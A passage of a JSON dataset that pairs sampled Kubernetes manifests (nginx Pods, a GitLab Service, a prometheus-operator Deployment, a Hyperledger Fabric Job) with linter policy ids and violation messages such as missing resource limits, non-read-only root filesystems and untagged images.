    "manifest_path": "data/manifests/the_stack_sample/sample_0440.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: gitlab\n  namespace: ci\nspec:\n  ports:\n  - name: ssh\n    protocol: TCP\n    port: 22\n    targetPort: 22\n  - name: http\n    protocol: TCP\n    port: 80\n    targetPort: 80\n  - name: registry\n    protocol: TCP\n    port: 5000\n    targetPort: 50000\n  type: NodePort\n  selector:\n    app: gitlab-ce\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:gitlab-ce])"
  },
  {
    "id": "1902",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1903",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "1904",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "1905",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "1906",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "1907",
    "manifest_path": "data/manifests/the_stack_sample/sample_0442.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/version: v0.39.0\n  name: prometheus-operator\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/version: v0.39.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --logtostderr=true\n        - --config-reloader-image=jimmidyson/configmap-reload:v0.3.0\n        - --prometheus-config-reloader=quay.io/coreos/prometheus-config-reloader:v0.39.0\n        image: quay.io/coreos/prometheus-operator:v0.39.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: prometheus-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus-operator\" does not have a read-only root file system"
  },
  {
    "id": "1908",
    "manifest_path": "data/manifests/the_stack_sample/sample_0442.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/version: v0.39.0\n  name: prometheus-operator\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/version: v0.39.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --logtostderr=true\n        - --config-reloader-image=jimmidyson/configmap-reload:v0.3.0\n        - --prometheus-config-reloader=quay.io/coreos/prometheus-config-reloader:v0.39.0\n        image: quay.io/coreos/prometheus-operator:v0.39.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: prometheus-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prometheus-operator\" not found"
  },
  {
    "id": "1909",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1910",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "1911",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "1912",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "1913",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "1914",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"edisonsupipelinesjavascriptdocker\" is using an invalid container image, \"containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1915",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" does not have a read-only root file system"
  },
  {
    "id": "1916",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" is not set to runAsNonRoot"
  },
  {
    "id": "1917",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" has cpu request 0"
  },
  {
    "id": "1918",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" has memory limit 0"
  },
  {
    "id": "1919",
    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pod-exemplo\" does not have a read-only root file system"
  },
  {
    "id": "1920",
    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pod-exemplo\" is not set to runAsNonRoot"
  },
  {
    "id": "1921",
    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pod-exemplo\" has cpu request 0"
  },
  {
    "id": "1922",
    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pod-exemplo\" has memory limit 0"
  },
  {
    "id": "1923",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "1924",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel1\" does not have a read-only root file system"
  },
  {
    "id": "1925",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel2\" does not have a read-only root file system"
  },
  {
    "id": "1926",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: 